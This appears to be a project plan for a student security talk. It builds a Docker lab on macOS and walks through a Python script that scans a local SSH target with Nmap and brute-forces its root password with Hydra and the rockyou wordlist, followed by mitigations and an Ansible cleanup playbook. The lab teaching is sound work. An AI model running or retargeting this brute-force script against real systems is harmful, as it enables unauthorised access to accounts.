# BootCon Project Setup (Category 02)

## 📌 Presentation Topic
**Developing a Python Script for Automated SSH Brute-Force Simulation Using Hydra and Nmap**

---

## 🧠 Project Goal
To demonstrate a Python-based automation script that performs an Nmap scan for open SSH ports and uses Hydra to simulate a brute-force SSH attack on a vulnerable container in a controlled lab environment.

---

## 🛠️ Technologies and Tools Used
- Python 3 (automation scripting)
- Docker (container runtime)
- Kali Linux Docker image (attacker)
- Ubuntu Docker image with OpenSSH server (target)
- Hydra (brute-force tool)
- Nmap (network scanner)

---

## 💻 Lab Setup on macOS Using Docker Only (No Docker Desktop / Colima Already Running)

### ✅ Step 1: Ensure Docker Is Pointing to Colima (already running)

Verify Colima is active:
```bash
colima list
```
Verify Docker context:
```bash
docker context use colima
```

---

### ✅ Step 2: Launch the Ubuntu SSH Target
```bash
docker run -dit --name target_ssh -p 2222:22 ubuntu /bin/bash
```

Install SSH server inside the Ubuntu container:
```bash
docker exec -it target_ssh bash
apt update
apt install openssh-server -y
service ssh start
passwd root  # Set password (e.g., toor)
exit
```

---

### ✅ Step 3: Launch Kali Attacker Container
```bash
docker run -dit --name kali_attacker kalilinux/kali-rolling /bin/bash
```

Install required tools inside Kali:
```bash
docker exec -it kali_attacker bash
apt update
apt install -y hydra nmap python3 wordlists
```

---

### ✅ Step 4: Create the Python Automation Script (inside Kali)

**File: ssh_bruteforce.py**
```python
import os

target_ip = "host.docker.internal"
target_port = 2222
username = "root"
wordlist = "/usr/share/wordlists/rockyou.txt"

print("[*] Scanning with Nmap...")
os.system(f"nmap -p {target_port} {target_ip}")

print("[*] Launching Hydra brute-force attack...")
os.system(f"hydra -l {username} -P {wordlist} -s {target_port} ssh://{target_ip}")
```

---

### ✅ Step 5: Run the Script
```bash
python3 ssh_bruteforce.py
```

Ensure `rockyou.txt` is unzipped first if necessary:
```bash
gunzip /usr/share/wordlists/rockyou.txt.gz
```

---

## 🧪 Demonstration
1. Show the Nmap SSH port scan results.
2. Show Hydra attempting to crack the SSH login.
3. Highlight successful brute-force login (if a weak password like `toor` is set).

---

## 🔒 Mitigation Techniques
- Disable root SSH login.
- Use key-based authentication only.
- Monitor brute-force attempts with fail2ban.
- Use strong passwords and change default credentials.

---

## 💻 Google Slides Checklist
- [ ] Title slide
- [ ] Background: SSH + Hydra + Python intro
- [ ] Why this project: automation, brute-force demonstration
- [ ] Technical concepts: SSH, brute-force, Python subprocess
- [ ] Lab setup slides: Docker only (Colima runtime)
- [ ] Live demo or video walkthrough
- [ ] Results and mitigation

---

## 🩱 Bonus: Cleanup Script
Use this Ansible playbook locally to clean up containers:

**File: `ssh-lab-cleanup.yml`**
```yaml
- name: Clean up SSH Lab
  hosts: localhost
  connection: local
  tasks:
    - name: Stop and remove Kali container
      community.docker.docker_container:
        name: kali_attacker
        state: absent
        force_kill: true

    - name: Stop and remove Ubuntu target container
      community.docker.docker_container:
        name: target_ssh
        state: absent
        force_kill: true
```
Run it with:
```bash
export DOCKER_HOST=unix:///Users/$(whoami)/.colima/default/docker.sock
ansible-playbook ssh-lab-cleanup.yml
```

---

## ✅ Summary
This presentation demonstrates real-world cybersecurity skills:
- Tool automation with Python
- Vulnerability simulation with Hydra
- Dockerized lab setup for repeatable demos using **Colima runtime on macOS** (no Docker Desktop)

It fits **Category 02: Developing a cybersecurity tool**.

Let me know when you're ready for the Google Slides layout or demo script!
